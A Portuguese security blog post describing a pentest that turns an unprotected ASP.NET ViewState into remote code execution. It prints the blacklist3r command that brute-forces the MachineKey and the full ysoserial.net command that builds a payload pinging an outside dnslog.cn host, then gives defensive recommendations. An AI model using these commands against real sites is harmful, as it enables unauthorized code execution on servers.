---
layout: post
title: ViewState Deserialization To RCE
author: bear
image: /assets/banners/viewstatedeser.png
description: "Exploitando VIEWSTATES e conseguindo um RCE OOB"
toc: true
---

```
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣶⣾⣿⣶⣦⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢘⣿⣿⣿⣿⣿⣿⣿⣷⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣴⣿⣿⣿⣿⣌⠙⣿⣿⣿⣤⣀⣀⣀⣴⣿⣿⣦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠠⢴⣶⣿⣿⣿⣿⣿⣿⣮⣻⣤⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣶⣦⣄⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣰⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣤⣀⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⣠⣴⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡛⠛⠻⢿⣿⣿⣿⣿⣿⣿⣿⣷⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⢈⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡟⣿⣿⣷⣶⣤⣴⣿⣿⣿⣿⣋⣽⣿⣿⣿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⣠⣤⣶⣿⣿⣿⣿⣿⣿⣿⣿⠟⢋⣼⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡜⠻⣿⣿⣿⣿⣿⣿⣿⣟⣋⣭⣿⣿⣿⣷⣦⣤⣤⣀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠈⣹⣿⣿⣿⣿⣿⣿⣿⣿⡿⠁⣴⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣶⣴⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡶⠶⣤⣀⡀
⠀⠀⣠⣾⣿⣿⣿⣿⣿⣿⣿⣿⡟⠀⠈⢠⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⢟⣩⣤⣶⣿⣿⣿⣿⣿⣿⣿⣟⢿⣿⣿⣦⣴⣾⣿⡇
⢀⣴⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡖⠀⢠⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠟⣿⠿⣿⡿⢿⣿⣿⣧⣿⣿⣿⣿⣿⡿⠁
⠜⠿⠛⠿⢿⣿⣿⣿⣿⣿⣿⣿⡇⠀⠊⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣟⠉⠀⡁⠀⠘⠀⢹⠁⠀⢹⣿⢿⣿⣿⡟⢻⡿⠀⠀
⠀⠀⠀⠀⠈⢿⣿⣿⣿⣿⣿⣿⡇⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡟⣿⣿⣿⣿⣋⠁⠀⠀⠉⠉⣸⡤⠤⣀⣸⠀⠀⢸⠁⠀⠉⠈⠀⢸⠀⠀⠀
⠀⠀⠀⠀⠀⠘⣿⣿⣿⣿⣿⣿⣧⣇⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠃⣿⣿⣿⡇⠀⠙⠉⠲⡄⢰⡿⠀⠀⠀⠈⡇⠀⡞⠒⠒⢲⠀⠀⡜⠀⠀⠀
⠀⠀⠀⠀⠀⠀⢻⣿⣿⣿⣿⣿⣿⣿⡄⠀⠹⠉⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡀⣿⣿⣿⣷⡀⠀⠀⠀⢸⣽⣧⡀⠀⠀⠀⢸⡼⠁⠀⠀⢸⢀⡴⠁⠀⠀⠀
⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⣄⠀⠀⢹⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⡸⣿⣿⣍⠉⠒⢄⠀⠘⣧⣤⡈⠒⡶⣆⠀⠀⠀⠀⠀⠈⠉⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣆⡀⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣽⣿⣿⣷⣦⣘⠉⠁⠻⢿⣿⣷⠃⢸⠒⢤⠀⠀⡞⡄⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠸⠈⢻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣽⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣤⣀⣼⠃⠀⢠⣷⣦⣧⡜⠀⢸⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣤⣾⣿⣿⣿⣿⣠⡎⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⢿⣿⣿⣿⣿⣿⣿⣿⣷⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡏⠀⠀⠈⠉⠛⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠉⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀⠀⠈⠁⠈⠋⠙⠛⠉⠛⠉⠿⠿⠛⡿⠋⠁⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢹⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢻⡿⠁⠀⠈⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠁⠀⠀⠀⠀⠈⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠿⣿⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣧⠀- Firewalls dont stop bears⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠛⠿⣿⠟⠻⣿⣿⡿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀=D⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⡿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
```

# Sumário

1. O que é o VIEWSTATE?
2. Introdução.
3. Obtendo a MachineKeys.
4. Preparando o Payload.
5. PoC Exploit.
6. Recomendações.
7. Conclusão.

# 1) O que é o VIEWSTATE?

O ViewState é um mecanismo incorporado na plataforma ASP.NET para persistir elementos da interface do utilizador e outros dados em pedidos sucessivos. Os dados a serem mantidos são serializados pelo servidor e transmitidos através de um campo de formulário oculto. Quando são lançados de volta ao servidor, o parâmetro ViewState é desserializado e os dados são recuperados.

# 2) Introdução!

Estava realizando um pentest para um amigo em um ambiente, e acabo me deparando com um webserver onde utilizava o Framework "Microsoft ASP.NET", e  neste momento ao analisar o codigo fonte usando o view-source do navegador percebi que tinha o "__VIEWSTATES" e "__VIEWSTATEGENERATOR", mas uma coisa que chamou a minha atenção foi que ao atualizar a pagina eles não se alteravam.

<img src="/assets/img/Pasted image 20230802113354.png">
<img src="/assets/img/Pasted image 20230802113553.png">

Após isso utilizei o a extensão "ViewStateDecoder"[1], que pode ser utilizado no BurpSuite. Após a instalação da extensão peguei o valor do viewstate que estava no website e fiz um decode, e assim percebendo que conseguimos decodar e que o MAC não esta habilitado. o que dificultaria o processo.

<img src="/assets/img/Pasted image 20230802185338.png">

Um dos fatos interessante é se deve ao fato desse viewstate poder ser controlado por qualquer pessoa para desserializar as informações sensíveis nele contidas, ou mesmo passar um viewstate malicioso para o processo de desserialização (isto será demonstrado mais tarde).

# 3) Obtendo a MachineKeys!!!

Vamos utilizar o blacklist3r que pode ser encontrado nos exemples do "badsecrets"[2]. Para realizar o BruteForce no VIEWSTATES e conseguir a MachineKeys validationkey  e descobrir o tipo de validationAlgo vamos utilizar o comando abaixo. nota-se que colocamos o viewstate e o viewstategenerator que foi pego no view-source do website.

```
python3 blacklist3r.py --viewstate /wEPDwUJOTE2MDg4OTExZGQldI9l1U1eHRoGgWNNqx8PZyM3NQ== -g 540E5640
```

Após montarmos o comando a ser utilizado vamos executa-lo... e conseguimos com sucesso a validationkey e o validationAlgo!!! =)

<img src="/assets/img/Pasted image 20230802110656.png">

Obtivemos a validationkey com sucesso, e também percebemos que o algoritmo de encriptação é SHA1. Essas informações que obtivemos agora será muito útil quando formos preparar o nosso payload!!!

# 4) Preparando o Payload!!!

Agora vamos utilizar o ysoserial.net[3] para gerar um payload serializado. Nota-se que no primeiro parâmetro setamos que o tipo de plugin que será para o ViewState, em seguinda o tipo de gadget chain, e em seguida comando a ser executado na maquina, o valor que estava no __ViewStateGenerator, o tipo de algoritimo do validationAlgo e por fim a nossa validationKey do MachineKeys.

O comando a ser executado será um PING em dos nosso subdomains gerados no dnslog[4], mas poderíamos ter utilizado outro como por exemplo o interactsh[5].

o comando final a ser utilizado ficou desta forma:

```
ysoserial.exe -p ViewState -g TypeConfuseDelegate -c "ping qlsqqg.dnslog.cn" --generator=540E5640 --validationalg="SHA1" --validationkey="F9D1A2D3E1D3E2F7B3D9F90FF3965ABDAC304902"
```

Agora vamos executar o nosso comando...

<img src="/assets/img/Pasted image 20230802114402.png">

Pronto, apos executar o nosso comando já pronto conseguimos o nosso payload serializado para ser utilizado.. vamos para a melhor parte!!! =D
# 5) PoC Exploit

Chegamos na melhor parte... neste momento fui em um campo de busca do website localizado na "Home.aspx" e abri o Burp Suite e interceptei o request POST. alterei o __VIEWSTATE original e coloquei o nosso que foi gerado no ysoserial.net. 

Observação: poderíamos ter simplesmente colocado um **```/Home.aspx?__VIEWSTATES=PAYLOAD-YSOSERIAL```** na url do website, mas fazer de um jeito mais "PROFISSIONAL", e evitar algum possível problema que poderia aparecer pela falta de outros parâmetros e seus valores.

<img src="/assets/img/Pasted image 20230802222944.png">

Agora vamos no DNSLOG onde o nosso subdomain foi gerado, mas lembre-se que no nosso payload o comando a ser executado é um PING no nosso dominio do dnslog... Agora vamos enviar o request!!!

<img src="/assets/img/Pasted image 20230802114816.png">

Observamos que conseguimos executar o comando na maquina que hospeda o webserver, assim conseguindo validar o nosso RCE. O tipo de técnica a ser usada para explorar esse tipo de RCE é o **Out of Band Exploitation (OOB)**.

A técnica Out-Of-Band (OOB) [6] fornece a um atacante uma forma alternativa de confirmar e explorar uma vulnerabilidade que, de outra forma, é "cega". Numa vulnerabilidade cega, o atacante não obtém o resultado da vulnerabilidade na resposta direta ao website vulnerável. As técnicas OOB requerem frequentemente que o server vulnerável gere um pedido TCP/UDP/ICMP de saída, o que permitirá a um atacante exfiltrar dados.  
# 6) Recomendações

A lista seguinte mostra como defender os riscos deste ataque:

- Certifique-se de que a validação MAC está ativada.
- Se o parâmetro ViewState só for utilizado em uma máquina, certifique-se de que os parâmetros MachineKey estão a ser gerados dinamicamente a cada atualização da pagina por aplicação.
- Encripte quaisquer parâmetros sensíveis, como a secção machineKey no arquivo de configuração (Web.config).
- Todas as chaves de validação ou de desencriptação divulgadas têm de ser geradas de novo.
-  Certifique-se de que as páginas de erro personalizadas estão a ser utilizadas e que os utilizadores não podem ver as mensagens de erros reais causando um path disclosure.

# 7) Conclusão

Vimos como o ViewStates pode ser explorando e uma breve explicação sobre a técnica de exploração **Out of Band Exploitation (OOB)**. Deixarei abaixo alguns conteúdos sobre exploração em ViewStates [7]-[8]-[9]. Bom, estamos no fim deste paper, espero que realmente tenham gostado, se tiverem qualquer duvida estou disposto a ajudar, basta entrar em contato comigo. 

Obrigado por ler até aqui, e até a próxima! =)

```
⠀⠀⠀⢰⡆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠘⡇⠀⠀⠀⢠⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⢷⠀⢠⢣⡏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⢘⣷⢸⣾⣇⣶⣦⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⣿⣿⣿⣹⣿⣿⣷⣿⣆⣀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⢼⡇⣿⣿⣽⣶⣶⣯⣭⣷⣶⣿⣿⣶⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠸⠣⢿⣿⣿⣿⣿⡿⣛⣭⣭⣭⡙⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀eat
⠀⠀⠀⠀⠀⠀⠀⠸⣿⣿⣿⣿⣿⠿⠿⠿⢯⡛⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀evade
⠀⠀⠀⠀⠀⠀⠀⠀⢠⣿⣿⣿⣿⣾⣿⡿⡷⢿⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀sleep
⠀⠀⠀⠀⠀⠀⠀⡔⣺⣿⣿⣽⡿⣿⣿⣿⣟⡳⠦⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀repeat
⠀⠀⠀⠀⠀⠀⢠⣭⣾⣿⠃⣿⡇⣿⣿⡷⢾⣭⡓⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⣾⣿⡿⠷⣿⣿⡇⣿⣿⣟⣻⠶⣭⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⣋⣵⣞⣭⣮⢿⣧⣝⣛⡛⠿⢿⣦⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⣀⣀⣠⣶⣿⣿⣿⣿⡿⠟⣼⣿⡿⣟⣿⡇⠀⠙⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⡼⣿⣿⣿⢟⣿⣿⣿⣷⡿⠿⣿⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠉⠁⠀⢉⣭⣭⣽⣯⣿⣿⢿⣫⣮⣅⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⢀⣿⣟⣽⣿⣿⣿⣿⣾⣿⣿⣯⡛⠻⢷⣶⣤⣄⡀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⢀⡞⣾⣿⣿⣿⣿⡟⣿⣿⣽⣿⣿⡿⠀⠀⠀⠈⠙⠛⠿⣶⣤⣄⡀⠀⠀
⠀⠀⠀⣾⣸⣿⣿⣷⣿⣿⢧⣿⣿⣿⣿⣿⣷⠁⠀⠀⠀⠀⠀⠀⠀⠈⠙⠻⢷⣦
⠀⠀⠀⡿⣛⣛⣛⣛⣿⣿⣸⣿⣿⣿⣻⣿⣿⠆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⢸⡇⣿⣿⣿⣿⣿⡏⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⢰⣶⣶⣶⣾⣿⢃⣿⣿⣿⣿⣯⣿⣭⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
```

- ![[1] https://github.com/raise-isayan/ViewStateDecoder/tree/master/release](https://github.com/raise-isayan/ViewStateDecoder/tree/master/release)
- ![[2] https://github.com/blacklanternsecurity/badsecrets](https://github.com/blacklanternsecurity/badsecrets)
- ![[3] https://github.com/pwntester/ysoserial.net/](https://github.com/pwntester/ysoserial.net/)
- ![[4] http://dnslog.cn/](http://dnslog.cn/)
- ![[5] https://app.interactsh.com/](https://app.interactsh.com/)
- ![[6] https://notsosecure.com/out-band-exploitation-oob-cheatsheet](https://notsosecure.com/out-band-exploitation-oob-cheatsheet)
- ![[7] https://soroush.me/blog/2019/04/exploiting-deserialisation-in-asp-net-via-viewstate/](https://soroush.me/blog/2019/04/exploiting-deserialisation-in-asp-net-via-viewstate/)
- ![[8] https://github.com/Y4er/dotnet-deserialization/blob/main/ViewState.md](https://github.com/Y4er/dotnet-deserialization/blob/main/ViewState.md)
- ![[9] https://notsosecure.com/exploiting-viewstate-deserialization-using-blacklist3r-and-ysoserial-net](https://notsosecure.com/exploiting-viewstate-deserialization-using-blacklist3r-and-ysoserial-net)
